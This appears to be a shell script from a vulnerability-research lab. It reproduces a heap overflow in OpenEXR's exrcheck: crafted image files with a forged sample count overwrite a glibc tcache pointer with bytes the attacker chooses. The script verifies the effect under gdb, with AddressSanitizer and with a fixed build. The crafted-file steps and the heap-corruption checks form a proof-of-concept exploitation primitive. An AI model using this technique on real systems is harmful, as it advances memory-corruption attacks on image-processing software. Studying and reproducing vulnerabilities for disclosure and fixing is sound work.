#!/bin/sh
# W190: a forged N=1072 makes the SECOND inverse-sort copy cover a live
# glibc tcache user pointer in the UNMODIFIED upstream exrcheck -c binary.
# The tcache `next` word is overwritten with the file-chosen fill byte;
# three fills prove the bytes track the file.  This is chosen bytes in live
# heap metadata (rung 4), NOT steering, control flow, wire or rung 5.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-w190 evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi
bin-vuln-plain/gen_baseline_deep_mixed work-w190/baseline_deep_mixed.exr \
    > /dev/null
test "$(sha256sum work-w190/baseline_deep_mixed.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04

# Keep every path the same length: heap layout in the consumer depends on the
# filename string length (W189).  Fill bytes 5a/3c/00 differ only in content.
for byte in 5a 3c 00; do
    case $byte in
        5a) want=663d02672f973b5d0affd36364185729551157be1928f5c48ad3e7d365b45c16 ;;
        3c) want=3f969d0524e681840035a5642aa92a3f8ef7de7c1d6affc7fce1356e62d4034d ;;
        00) want=1c57f2570a366d765d38777dbc49ecbd1c59e5a11ce0e6c4e43890aeddec46f2 ;;
    esac
    python3 cases/make_poc_mixed.py work-w190/baseline_deep_mixed.exr \
        "work-w190/poc_n1072_${byte}.exr" 1072 "0x$byte" > /dev/null
    test "$(sha256sum "work-w190/poc_n1072_${byte}.exr" | cut -d' ' -f1)" = "$want"
done

norm() {
    awk '
        /^NEXT-.*-VAL=/ { print; next }
        { gsub(/==[0-9]+==/, "==PID==") }
        { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
        { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
        { print }
    '
}

# Safe-input control: valid baseline file, plain consumer, no ASan, rc 0.
set +e
./build-vuln-plain/bin/exrcheck -c work-w190/baseline_deep_mixed.exr \
    > evidence/w190-baseline.out 2>&1
base_rc=$?
set -e
printf 'RC=%s\n' "$base_rc" >> evidence/w190-baseline.out
[ "$base_rc" -eq 0 ]
grep -q 'OK' evidence/w190-baseline.out

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
for byte in 5a 3c 00; do
    gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
        -ex 'set disable-randomization on' \
        -ex 'break sort2_4ByteChannels_tiled' \
        -ex "run -c work-w190/poc_n1072_${byte}.exr" \
        -x harness/w190-tcache-overflow.cmd \
        ./build-vuln-plain/bin/exrcheck > "$RAW" 2>&1 || true
    norm < "$RAW" > "evidence/w190-gdb-n1072-${byte}.out"
    g="evidence/w190-gdb-n1072-${byte}.out"
    grep -q 'WINDOW_HEADS=\[(7, 4304)\]' "$g"
    grep -q 'TCACHE-WATCH idx=7 off=+4304 ptr=ADDR' "$g"
    grep -qE '^NEXT-BEFORE-VAL=0x[0-9a-f]{16}$' "$g"
    grep -q 'COPY1 dst-out=+0 len=4288' "$g"
    grep -q 'COPY2 dst-out=+4288 len=2144' "$g"
    grep -q 'NEXT-AFTER-VAL=0x'"$byte$byte$byte$byte$byte$byte$byte$byte"'$' "$g"
    grep -q 'double free or corruption' "$g"
    grep -q 'SIGABRT' "$g"
    before=$(grep '^NEXT-BEFORE-VAL=' "$g" | cut -d= -f2)
    after=$(grep '^NEXT-AFTER-VAL=' "$g" | cut -d= -f2)
    [ "$before" != "$after" ]
done

# Sanitizer and fixed-build controls on the same crafted file.
set +e
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c work-w190/poc_n1072_5a.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
norm < "$RAW" > evidence/w190-asan-n1072.out
[ "$asan_rc" -eq 1 ]
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w190-asan-n1072.out
grep -q 'READ of size 4288' evidence/w190-asan-n1072.out
grep -q 'internal_zstd.c:472' evidence/w190-asan-n1072.out
grep -q 'exr_decoding_run' evidence/w190-asan-n1072.out

set +e
./build-fixed-asan/bin/exrcheck -c work-w190/poc_n1072_5a.exr \
    > "$RAW" 2>&1
fixed_rc=$?
set -e
norm < "$RAW" > evidence/w190-fixed-n1072.out
[ "$fixed_rc" -eq 1 ]
grep -q 'bad' evidence/w190-fixed-n1072.out
! grep -q 'ERROR: AddressSanitizer' evidence/w190-fixed-n1072.out

printf 'RESULT PASS\n'
sha256sum evidence/w190-baseline.out evidence/w190-gdb-n1072-5a.out evidence/w190-gdb-n1072-3c.out evidence/w190-gdb-n1072-00.out evidence/w190-asan-n1072.out evidence/w190-fixed-n1072.out
